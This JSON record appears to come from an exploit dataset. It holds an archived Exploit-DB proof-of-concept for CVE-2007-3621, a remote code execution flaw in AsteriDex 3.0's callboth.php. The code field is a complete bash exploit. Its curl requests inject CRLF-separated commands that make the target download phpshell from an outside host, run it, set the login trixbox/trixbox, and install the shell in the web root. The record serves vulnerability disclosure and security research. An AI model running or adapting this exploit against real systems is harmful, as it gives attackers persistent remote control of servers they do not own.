{
  "id": "4151",
  "title": "AsteriDex 3.0 - &#039;callboth.php&#039; Remote Code Execution",
  "cve": "CVE-2007-3621",
  "vuln_type": "rce",
  "code": "##\r\n## Begin exploit\r\n##\r\n#!/bin/bash\r\n\r\necho Asteridex PoC Exploit (callboth.php vulnerability)\r\necho By Carl Livitt / Hoku Security / June 2007\r\necho\r\n\r\n# This has to be (a) a valid SIP address, and (b) must answer when dialled.\r\n# The exploit will fail without these conditions being met.\r\n# Currently uses the Melonite SIP echo test service.\r\nSIP=\"190@sip.melonite.nu\"\r\n\r\n# Magic number, don't change. The default installation of AsteriDex checks\r\n# for this number and fails without it.\r\nSEQ=654321\r\n\r\n# Other stuff we need\r\nLOC=/asteridex/callboth.php\r\nOUT=123456\r\n\r\n# Sanity\r\nif [ \"$1X\" == \"X\" ]; then\r\n       echo Syntax: $0 \\<Host IP\\[:port\\]\\>\r\n       echo For example: $0 www.example.com:8080\r\n       exit 1\r\nfi\r\n\r\n# Insanity\r\necho \"[-] Exploiting host $1 - please wait\"\r\necho -n '[+]' Building shell script\r\ncurl \"http://$1/$LOC?SEQ=$SEQ&OUT=$OUT&IN=$SIP%0d%0aApplication:%20System%0d%0aData:%20echo%20\\!/bin/sh>/tmp/t%0d%0a\" &>/dev/null\r\necho -n .\r\ncurl \"http://$1/$LOC?SEQ=$SEQ&OUT=$OUT&IN=$SIP%0d%0aApplication:%20System%0d%0aData:%20echo%20%2dn%20wget%20%2dO%20x.tar.bz2%20%5c%27http://%3e%3e/tmp/t%0d%0a\" &>/dev/null\r\necho -n .\r\ncurl \"http://$1/$LOC?SEQ=$SEQ&OUT=$OUT&IN=$SIP%0d%0aApplication:%20System%0d%0aData:%20echo%20%2dn%20prdownloads.sf.net/phpshell/%3e%3e/tmp/t%0d%0a\" &>/dev/null\r\necho .\r\ncurl \"http://$1/$LOC?SEQ=$SEQ&OUT=$OUT&IN=$SIP%0d%0aApplication:%20System%0d%0aData:%20echo%20phpshell%2d2.1.tar.bz2%3fdownload%5c%27%3e%3e/tmp/t%0d%0a\" &>/dev/null\r\necho '[+] Executing shell script'\r\ncurl \"http://$1/$LOC?SEQ=$SEQ&OUT=$OUT&IN=$SIP%0d%0aApplication:%20System%0d%0aData:%20cd%20/tmp;chmod%20%2bx%20t;./t;tar%20jxf%20x.tar.bz2%0d%0a\" &>/dev/null\r\necho -n '[+] Setting up phpshell'\r\ncurl \"http://$1/$LOC?SEQ=$SEQ&OUT=$OUT&IN=$SIP%0d%0aApplication:%20System%0d%0aData:%20cd%20cd%20/tmp;mv%20phpshell-2.1%20p%0d%0a\" &>/dev/null\r\necho -n .\r\ncurl \"http://$1/$LOC?SEQ=$SEQ&OUT=$OUT&IN=$SIP%0d%0aApplication:%20System%0d%0aData:%20cd%20/tmp/p;echo%20%5c%5busers%5c%5d>config.php%0d%0a\" &>/dev/null\r\necho -n .\r\ncurl \"http://$1/$LOC?SEQ=$SEQ&OUT=$OUT&IN=$SIP%0d%0aApplication:%20System%0d%0aData:%20cd%20/tmp/p;echo%20%27trixbox%3d%22trixbox%22%27>>config.php%0d%0a\" &>/dev/null\r\necho .\r\ncurl \"http://$1/$LOC?SEQ=$SEQ&OUT=$OUT&IN=$SIP%0d%0aApplication:%20System%0d%0aData:%20mv%20/tmp/p%20/var/www/html/phpshell%0d%0a\" &>/dev/null\r\n\r\n# Have a nice day\r\necho \"Done! You should now be able to browse to http://$1/phpshell/phpshell.php\"\r\necho You can login with the username \\'trixbox\\' and password \\'trixbox\\'\r\n\r\n##\r\n## End Exploit\r\n##\r\n\r\n# milw0rm.com [2007-07-05]",
  "url": "https://www.exploit-db.com/exploits/4151"
}